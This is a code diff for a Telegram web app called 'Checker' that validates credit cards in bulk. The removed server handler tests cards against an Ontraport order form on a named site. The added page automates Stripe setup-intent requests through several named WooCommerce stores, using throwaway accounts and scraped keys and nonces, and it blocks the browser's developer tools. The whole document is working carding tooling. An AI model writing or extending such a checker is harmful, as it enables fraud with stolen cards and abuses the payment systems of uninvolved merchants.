@@ -1,224 +1,555 @@
-import fetch from 'node-fetch';
-import crypto from 'crypto';
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>Checker</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-export default async function handler(req, res) {
-    if (req.method !== 'POST') {
-        return res.status(405).json({ error: 'Method not allowed' });
-    }
+        body {
+            background: #000;
+            color: #ccc;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 12px;
+        }
 
-    const { cc } = req.body;
-    const result = await ontraportCheck(cc);
-    return res.status(200).json(result);
-}
+        .app {
+            width: 100%;
+            max-width: 420px;
+            background: #0a0a0a;
+            border-radius: 24px;
+            padding: 20px 16px 24px;
+            border: 1px solid #181818;
+        }
 
-async function ontraportCheck(ccInput) {
-    const [number, month, year, cvv] = ccInput.split('|');
-    const cleanNumber = number.replace(/\D/g, '');
-    const cleanMonth = month.padStart(2, '0');
-    const cleanYear = year.length === 2 ? `20${year}` : year;
-    const cleanCVV = cvv;
-    const year2 = cleanYear.slice(-2);
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 18px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid #141414;
+        }
 
-    function desEncrypt(key, data) {
-        const cipher = crypto.createCipheriv('des-ecb', Buffer.from(key, 'utf8'), null);
-        let encrypted = cipher.update(data, 'utf8', 'hex');
-        encrypted += cipher.final('hex');
-        return '0x' + encrypted;
-    }
+        .header .brand {
+            font-size: 20px;
+            font-weight: 700;
+            color: #e0e0e0;
+        }
 
-    function encryptForm(dataDict) {
-        return desEncrypt('Un1cOrns', JSON.stringify(dataDict));
-    }
+        .header .online {
+            font-size: 12px;
+            color: #333;
+        }
 
-    function extractHidden(html, name) {
-        const regex = new RegExp(`name="${name}"[^>]*value="([^"]*)"`);
-        const match = html.match(regex);
-        return match ? match[1] : '';
-    }
+        .header .online i {
+            color: #4ade80;
+            font-size: 7px;
+            margin-right: 4px;
+        }
 
-    const urlPage = 'https://kiyosakiresearch.com/TKL-OF';
+        textarea {
+            width: 100%;
+            padding: 14px;
+            background: #0d0d0d;
+            border: 1px solid #181818;
+            border-radius: 12px;
+            color: #d0d0d0;
+            font-size: 13px;
+            font-family: 'Courier New', monospace;
+            resize: vertical;
+            min-height: 90px;
+            outline: none;
+            line-height: 1.7;
+        }
 
-    // 1. GET page
-    const sessionRes = await fetch(urlPage, {
-        headers: {
-            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
+        textarea:focus {
+            border-color: #2a2a2a;
+        }
+
+        textarea::placeholder {
+            color: #222;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+        }
+
+        .card-count {
+            text-align: right;
+            font-size: 12px;
+            color: #222;
+            margin-top: 6px;
+        }
+
+        .gate-area {
+            background: #0a0a0a;
+            border-radius: 12px;
+            padding: 12px 14px;
+            margin: 14px 0;
+            border: 1px solid #141414;
+        }
+
+        .gate-area .gate-label {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+
+        .gate-area .gate-label span {
+            font-size: 12px;
+            color: #444;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .gate-area select {
+            width: 100%;
+            padding: 10px 12px;
+            background: #0d0d0d;
+            border: 1px solid #181818;
+            border-radius: 8px;
+            color: #ccc;
+            font-size: 14px;
+            outline: none;
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%23333' stroke-width='2' fill='none'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 12px center;
+            cursor: pointer;
+        }
+
+        .start-btn {
+            width: 100%;
+            padding: 14px;
+            background: #141414;
+            border: 1px solid #222;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 600;
+            color: #e0e0e0;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .start-btn:active {
+            transform: scale(0.97);
+        }
+
+        .start-btn:disabled {
+            opacity: 0.3;
+        }
+
+        .stats-bar {
+            display: flex;
+            gap: 8px;
+            margin: 16px 0 12px;
+        }
+
+        .stats-bar .stat {
+            flex: 1;
+            text-align: center;
+            padding: 10px 0;
+            background: #0a0a0a;
+            border-radius: 10px;
+            border: 1px solid #141414;
+        }
+
+        .stats-bar .stat .number {
+            font-size: 20px;
+            font-weight: 700;
+            color: #e0e0e0;
+        }
+
+        .stats-bar .stat .label {
+            font-size: 9px;
+            color: #333;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-top: 2px;
+        }
+
+        .stats-bar .stat.approved .number { color: #4ade80; }
+        .stats-bar .stat.declined .number { color: #f87171; }
+
+        .results-area {
+            margin-top: 10px;
+            max-height: 280px;
+            overflow-y: auto;
+        }
+
+        .results-area::-webkit-scrollbar {
+            width: 3px;
+        }
+        .results-area::-webkit-scrollbar-track {
+            background: #0a0a0a;
+        }
+        .results-area::-webkit-scrollbar-thumb {
+            background: #1a1a1a;
+            border-radius: 3px;
+        }
+
+        .result-item {
+            display: flex;
+            flex-direction: column;
+            padding: 10px 12px;
+            background: #0d0d0d;
+            border-radius: 8px;
+            margin-bottom: 4px;
+            border-left: 2px solid #1a1a1a;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            animation: fadeIn 0.2s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateX(-5px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        .result-item.approved {
+            border-left-color: #4ade80;
+        }
+        .result-item.declined {
+            border-left-color: #f87171;
+        }
+
+        .result-item .row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .result-item .cc {
+            color: #666;
+            font-size: 12px;
+        }
+        .result-item .status {
+            font-weight: 600;
+            font-size: 11px;
+        }
+        .result-item.approved .status { color: #4ade80; }
+        .result-item.declined .status { color: #f87171; }
+
+        .result-item .message {
+            font-size: 11px;
+            color: #444;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            margin-top: 4px;
+            padding-top: 4px;
+            border-top: 1px solid #141414;
+            word-break: break-all;
+        }
+
+        .no-results {
+            text-align: center;
+            color: #1a1a1a;
+            font-size: 13px;
+            padding: 16px 0;
+        }
+
+        .status-msg {
+            text-align: center;
+            font-size: 12px;
+            color: #2a2a2a;
+            margin-top: 6px;
+            min-height: 18px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="app">
+    <div class="header">
+        <div class="brand">checker</div>
+        <span class="online"><i>●</i> <span id="online-count">0</span></span>
+    </div>
+
+    <textarea id="card-input" placeholder="4111111111111111 | 12 | 2027 | 118"></textarea>
+    <div class="card-count"><span id="card-count">0</span> cards</div>
+
+    <div class="gate-area">
+        <div class="gate-label">
+            <span>gate</span>
+            <span id="gate-status" style="color:#333;">● stripe auth</span>
+        </div>
+        <select id="gate-select">
+            <option value="stripe_auth">stripe auth</option>
+        </select>
+    </div>
+
+    <button class="start-btn" id="start-btn" onclick="startCheck()">▶ start</button>
+
+    <div class="status-msg" id="status-msg"></div>
+
+    <div class="stats-bar">
+        <div class="stat">
+            <div class="number" id="live-count">0</div>
+            <div class="label">live</div>
+        </div>
+        <div class="stat approved">
+            <div class="number" id="approved-count">0</div>
+            <div class="label">approved</div>
+        </div>
+        <div class="stat declined">
+            <div class="number" id="declined-count">0</div>
+            <div class="label">declined</div>
+        </div>
+    </div>
+
+    <div class="results-area" id="results-container">
+        <div class="no-results">no results</div>
+    </div>
+</div>
+
+<script>
+    const tg = window.Telegram.WebApp;
+    tg.expand();
+
+    const user = tg.initDataUnsafe?.user || { id: 'guest' };
+
+    const input = document.getElementById('card-input');
+    const cardCount = document.getElementById('card-count');
+    const resultsContainer = document.getElementById('results-container');
+    const liveCount = document.getElementById('live-count');
+    const approvedCount = document.getElementById('approved-count');
+    const declinedCount = document.getElementById('declined-count');
+    const startBtn = document.getElementById('start-btn');
+    const statusMsg = document.getElementById('status-msg');
+
+    let live = 0, approved = 0, declined = 0;
+    let isRunning = false;
+
+    input.addEventListener('input', function() {
+        const lines = this.value.split('\n').filter(l => l.trim() !== '');
+        cardCount.textContent = lines.length;
+    });
+
+    document.addEventListener('keydown', (e) => {
+        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key.toUpperCase())) || (e.ctrlKey && e.key === 'u')) {
+            e.preventDefault();
+            tg.showAlert('disabled');
         }
     });
+    document.addEventListener('contextmenu', (e) => e.preventDefault());
 
-    if (sessionRes.status !== 200) {
-        return { status: 'declined', message: `HTTP ${sessionRes.status}` };
+    // ========== STRIPE AUTH ==========
+    const AUTH_SITES = [
+        'https://pathosceramiche.com',
+        'https://josephamichael.com',
+        'https://perfectible.net'
+    ];
+
+    async function stripeAuthCheck(cc) {
+        const [number, month, year, cvv] = cc.split('|');
+        const pan = number.replace(/\D/g, '');
+        const expM = month.padStart(2, '0');
+        const expY = year.slice(-2);
+        const cleanCVV = cvv;
+
+        const sites = [...AUTH_SITES];
+        for (let i = sites.length - 1; i > 0; i--) {
+            const j = Math.floor(Math.random() * (i + 1));
+            [sites[i], sites[j]] = [sites[j], sites[i]];
+        }
+
+        for (const site of sites) {
+            try {
+                const result = await checkCardOnSite(site, pan, expM, expY, cleanCVV);
+                return result;
+            } catch (_) {}
+        }
+
+        return { status: 'declined', message: 'all sites failed' };
     }
 
-    const html = await sessionRes.text();
+    async function checkCardOnSite(baseUrl, pan, expM, expY, cvv) {
+        const addPmUrl = `${baseUrl}/my-account/add-payment-method/`;
 
-    // 2. Extract iframe params
-    const iframeMatch = html.match(/https:\/\/forms\.ontraport\.com\/v2\.4\/ccpci\/www\/ccelt\.php\?([^"]+)/);
-    if (!iframeMatch) {
-        return { status: 'declined', message: 'iframe not found' };
+        const email = `user${Math.random().toString(36).slice(2, 10)}@gmail.com`;
+        const registerRes = await fetch(addPmUrl, {
+            method: 'POST',
+            headers: {
+                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
+                'Content-Type': 'application/x-www-form-urlencoded'
+            },
+            body: new URLSearchParams({
+                email: email,
+                woocommerce-register-nonce: '',
+                _wp_http_referer: '/my-account/add-payment-method/',
+                register: 'Register'
+            })
+        });
+
+        const html = await registerRes.text();
+
+        const keyMatch = html.match(/pk_(?:live|test)_[a-zA-Z0-9]+/);
+        if (!keyMatch) throw new Error('stripe key not found');
+        const stripePubKey = keyMatch[0];
+
+        let nonceMatch = html.match(/"createAndConfirmSetupIntentNonce"\s*:\s*"([^"]+)"/);
+        if (!nonceMatch) {
+            nonceMatch = html.match(/createAndConfirmSetupIntentNonce["\s:]+([^"\s,]+)/);
+        }
+        if (!nonceMatch) throw new Error('nonce not found');
+        const setupIntentNonce = nonceMatch[1];
+
+        const stripeRes = await fetch('https://api.stripe.com/v1/payment_methods', {
+            method: 'POST',
+            headers: {
+                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
+                'Accept': 'application/json',
+                'Origin': 'https://js.stripe.com',
+                'Referer': 'https://js.stripe.com/'
+            },
+            body: new URLSearchParams({
+                type: 'card',
+                'card[number]': pan,
+                'card[cvc]': cvv,
+                'card[exp_year]': expY,
+                'card[exp_month]': expM,
+                allow_redisplay: 'unspecified',
+                'billing_details[address][country]': 'TR',
+                key: stripePubKey,
+                _stripe_version: '2024-06-20'
+            })
+        });
+
+        const stripeData = await stripeRes.json();
+        const pmId = stripeData.id;
+        if (!pmId) {
+            const err = stripeData.error?.message || 'stripe error';
+            throw new Error(err);
+        }
+
+        const wcRes = await fetch(baseUrl, {
+            method: 'POST',
+            headers: {
+                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
+                'Accept': 'application/json, text/javascript, */*; q=0.01',
+                'x-requested-with': 'XMLHttpRequest',
+                'Origin': baseUrl,
+                'Referer': addPmUrl
+            },
+            body: new URLSearchParams({
+                'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
+                action: 'create_and_confirm_setup_intent',
+                'wc-stripe-payment-method': pmId,
+                'wc-stripe-payment-type': 'card',
+                _ajax_nonce: setupIntentNonce
+            })
+        });
+
+        const wcData = await wcRes.json();
+
+        if (wcData.success === true) {
+            return { status: 'approved', message: '✅ Auth Success' };
+        }
+
+        const errMsg = wcData.data?.error?.message || wcData.data?.message || 'auth failed';
+        return { status: 'declined', message: `❌ ${errMsg}` };
     }
 
-    const iframeParams = new URLSearchParams(iframeMatch[1].replace(/&amp;/g, '&'));
-    const aid = iframeParams.get('aid');
-    const blockId = iframeParams.get('blockId');
-    const hashVal = iframeParams.get('hash') || '';
+    // ========== CHECK ==========
+    async function startCheck() {
+        if (isRunning) return;
 
-    if (!aid || !blockId) {
-        return { status: 'declined', message: 'aid/blockid not found' };
-    }
+        const raw = input.value.trim();
+        if (!raw) {
+            tg.showAlert('paste at least one card.');
+            return;
+        }
 
-    // 3. Extract hidden fields
-    const uid = extractHidden(html, 'uid');
-    const mopsbbk = extractHidden(html, 'mopsbbk');
-    const mopbelg = extractHidden(html, 'mopbelg');
-    let mrOpsblck = extractHidden(html, 'mr_opsblck');
-    let sess_ = extractHidden(html, 'sess_');
+        const cards = raw.split('\n').filter(l => l.trim() !== '');
 
-    if (!uid || !mopsbbk || !mopbelg) {
-        return { status: 'declined', message: 'hidden fields not found' };
-    }
+        isRunning = true;
+        startBtn.disabled = true;
+        startBtn.textContent = '⏳ checking...';
+        statusMsg.textContent = `0 / ${cards.length}`;
 
-    if (!mrOpsblck) {
-        mrOpsblck = '0xba5c1d70f2e284b38030e28edccecf20478d9ea257301d3271e985728953812f765da1ecbeff26547d6f83f00679d993422992185b368b003baff9b197afedb0820fb55d6522bf51';
-    }
-    if (!sess_) sess_ = '';
+        live = approved = declined = 0;
+        updateStats();
 
-    // 4. Get token
-    const tokenRes = await fetch('https://forms.ontraport.com/v2.4/ccpci/www/tokenize.php', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Origin': 'https://forms.ontraport.com',
-            'Referer': `https://forms.ontraport.com/v2.4/ccpci/www/ccelt.php?aid=${aid}&blockId=${blockId}&hash=${hashVal}`
-        },
-        body: new URLSearchParams({
-            payment_name: '',
-            payment_number: cleanNumber,
-            payment_expire_month: cleanMonth,
-            payment_expire_year: year2,
-            payment_code: cleanCVV,
-            aid: aid,
-            blockId: blockId,
-            hash: hashVal
-        })
-    });
+        const title = document.createElement('div');
+        title.style.cssText = 'font-size:11px;color:#222;margin-bottom:8px;';
+        title.textContent = 'results';
+        resultsContainer.innerHTML = '';
+        resultsContainer.appendChild(title);
 
-    let token = '';
-    try {
-        const tokenData = await tokenRes.json();
-        token = tokenData.token || '';
-    } catch (_) {}
+        for (let i = 0; i < cards.length; i++) {
+            const cc = cards[i].trim();
+            statusMsg.textContent = `${i + 1} / ${cards.length}`;
 
-    // 5. Build form
-    const formData = {
-        firstname: 'John',
-        lastname: 'Doe',
-        email: `user${Math.floor(Math.random() * 99999)}@gmail.com`,
-        sms_number: '1234567890',
-        address: '123 Main St',
-        address2: '',
-        country: 'US',
-        state: 'CA',
-        city: 'Los Angeles',
-        zip: '90210',
-        shipping_same_as_billing: 'off',
-        shipping_address1: '',
-        shipping_address2: '',
-        shipping_city: '',
-        shipping_state: '',
-        shipping_country: '',
-        shipping_zip: '',
-        f1806: 'on',
-        mr_opsblck: mrOpsblck,
-        orderform_block: 'true',
-        mopsbbk: mopsbbk,
-        mopbelg: mopbelg,
-        uid: uid,
-        afft_: '',
-        aff_: '',
-        sess_: sess_,
-        ref_: '',
-        own_: '',
-        oprid: '',
-        contact_id: '',
-        utm_source: '',
-        utm_medium: '',
-        utm_term: '',
-        utm_content: '',
-        utm_campaign: '',
-        referral_page: '',
-        _op_gclid: '',
-        _op_gcid: '',
-        _op_gsid: '',
-        _op_gsn: '',
-        _fbc: '',
-        _fbp: '',
-        _op_li_fat_id: '',
-        _op_last_gclid: '',
-        _op_last_gbraid: '',
-        _op_last_wbraid: '',
-        _op_last_google_click_at: '',
-        visiting_contact_id: '0',
-        card_number: cleanNumber,
-        uses_external_payment_element: '',
-        external_payment_element_token: token,
-        payment_expire_month: cleanMonth,
-        payment_expire_year: year2,
-        payment_code: cleanCVV
-    };
-
-    const encryptedHash = encryptForm(formData);
-    const mrRand = Math.floor(Math.random() * 9000000) + 1000000;
-
-    // 6. Submit
-    const finalRes = await fetch('https://forms.ontraport.com/v2.4/cc_verify.php', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Origin': 'https://forms.ontraport.com',
-            'Referer': `https://forms.ontraport.com/v2.4/cc_verify.php?mr_rand=${mrRand}&uid=${uid}&submitAttempts=1&parent_url=${encodeURIComponent(urlPage)}`
-        },
-        body: new URLSearchParams({
-            hash: encryptedHash,
-            mr_rand: mrRand,
-            uid: uid,
-            submitAttempts: '1',
-            parent_url: urlPage
-        })
-    });
-
-    const finalText = await finalRes.text();
-
-    // 7. Parse result
-    const msgMatch = finalText.match(/const message = '([^']+)'/);
-    if (msgMatch) {
-        try {
-            const parsed = JSON.parse(msgMatch[1].replace(/\\'/g, "'"));
-            if (parsed.result_code === 0 || parsed.result_code === '0') {
-                return {
-                    status: 'approved',
-                    message: parsed.message || 'approved'
-                };
-            } else {
-                return {
-                    status: 'declined',
-                    message: parsed.message || 'declined'
-                };
+            try {
+                const result = await stripeAuthCheck(cc);
+                const status = result.status || 'declined';
+                const message = result.message || '';
+                showResult(cc, status, message);
+                if (status === 'approved') approved++;
+                else declined++;
+                live++;
+                updateStats();
+            } catch (err) {
+                showResult(cc, 'declined', '❌ Error');
+                declined++;
+                live++;
+                updateStats();
             }
-        } catch (_) {
-            return {
-                status: 'declined',
-                message: msgMatch[1]
-            };
         }
+
+        isRunning = false;
+        startBtn.disabled = false;
+        startBtn.textContent = '▶ start';
+        statusMsg.textContent = `done. approved: ${approved}, declined: ${declined}`;
+        tg.showAlert(`done. approved: ${approved}, declined: ${declined}`);
     }
 
-    if (finalText.includes('Thank You')) {
-        return { status: 'approved', message: 'approved' };
+    function showResult(cc, status, message) {
+        const div = document.createElement('div');
+        div.className = `result-item ${status}`;
+        const masked = cc.length > 4 ? cc.slice(0, 4) + '****' + cc.slice(-4) : cc;
+        const statusText = status === 'approved' ? '✓ Approved' : '✗ Declined';
+        div.innerHTML = `
+            <div class="row">
+                <span class="cc">${masked}</span>
+                <span class="status">${statusText}</span>
+            </div>
+            <div class="message">${message || ''}</div>
+        `;
+        resultsContainer.appendChild(div);
+        const noResult = resultsContainer.querySelector('.no-results');
+        if (noResult) noResult.remove();
+        resultsContainer.scrollTop = resultsContainer.scrollHeight;
     }
 
-    return {
-        status: 'declined',
-        message: finalText.slice(0, 60)
-    };
-}
+    function updateStats() {
+        liveCount.textContent = live;
+        approvedCount.textContent = approved;
+        declinedCount.textContent = declined;
+    }
+
+    // Online ping
+    setInterval(async () => {
+        try {
+            const res = await fetch('/api/online', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ user_id: user.id })
+            });
+            const data = await res.json();
+            document.getElementById('online-count').textContent = data.online || 0;
+        } catch (_) {}
+    }, 30000);
+
+    cardCount.textContent = input.value.split('\n').filter(l => l.trim() !== '').length;
+</script>
+</body>
+</html>
